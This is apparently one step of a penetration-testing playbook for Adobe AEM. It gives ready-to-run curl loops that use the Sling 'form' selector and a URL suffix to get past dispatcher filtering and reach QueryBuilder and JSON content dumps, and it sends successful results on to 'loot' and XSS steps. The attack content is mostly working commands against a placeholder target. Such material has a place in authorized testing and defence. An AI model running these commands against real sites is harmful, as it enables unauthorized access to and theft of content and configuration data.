# Batch 06 — Dispatcher bypass: `form` selector + suffix

## objective

Use the Sling **`form` selector** so the **suffix** becomes the real path inside AEM, while the dispatcher only “sees” a friendly prefix + extension (css/js/png).

## estimated_time

45–75 minutes

## prerequisites

- `PAGE` from batch 01 (any public page path)
- Prefer after 04–05 failed, or as extra path

## testing_workflow

### 1) Technique A — QueryBuilder via suffix

```bash
T="https://TARGET"
PAGE="/content/YOUR/PAGE"

for ext in css js png jpg html; do
  u="${PAGE}.form.${ext}/bin/querybuilder.json?path=/content&p.limit=3"
  code=$(curl -sk -o /tmp/qb.out -w "%{http_code}" "$T$u")
  size=$(wc -c </tmp/qb.out)
  echo "$code $size  $u"
  grep -qE 'hits|success' /tmp/qb.out && head -c 220 /tmp/qb.out && echo
done
```

Also try a DAM root:

```bash
curl -sk -o /tmp/qb.out -w "%{http_code} size=%{size_download}\n" \
  "$T/content/dam.form.js/bin/querybuilder.json?path=/&p.limit=3"
head -c 300 /tmp/qb.out; echo
```

### 2) Technique B — JSON dump via suffix

```bash
curl -sk -o /tmp/n.json -w "%{http_code} size=%{size_download}\n" \
  "$T${PAGE}.form.png/content.3.json"
head -c 300 /tmp/n.json; echo

curl -sk -o /tmp/n.json -w "%{http_code} size=%{size_download}\n" \
  "$T${PAGE}.form.css/etc.1.json"
head -c 300 /tmp/n.json; echo
```

### 3) Technique C — note patched vs open

If all 404/empty: likely patched (CVE-2024-26029 era) or selector blocked.  
Record attempts; do not burn an hour retrying random pages beyond 2–3 `PAGE`s.

```bash
# Second page only if first failed
PAGE2="/content/OTHER/PAGE"
curl -sk -o /tmp/qb.out -w "%{http_code}\n" \
  "$T${PAGE2}.form.css/bin/querybuilder.json?path=/content&p.limit=2"
```

## decision_points

| If… | Then… |
|-----|--------|
| QueryBuilder or `.json` dump works | Save URL → **07** (and later **11** for chains) |
| form works but QB ACL empty | Try dumps of `/content` only; still go **07** lightly / **08** |
| Total failure after 04–06 | Proceed to **09** selector XSS + **12** Forms; loot may be dead on publish |

## expected_findings

- Dispatcher bypass via suffix forward  
- Access to `/bin/*` or `.json` trees previously 404

## next_batch_to_continue_with

- Any data access → **[07-loot-querybuilder.md](./07-loot-querybuilder.md)**  
- No data access at all → **[09-xss-rawcontent.md](./09-xss-rawcontent.md)** (pivot to XSS track)  
  (Still schedule **12** if Forms flagged in batch 01)
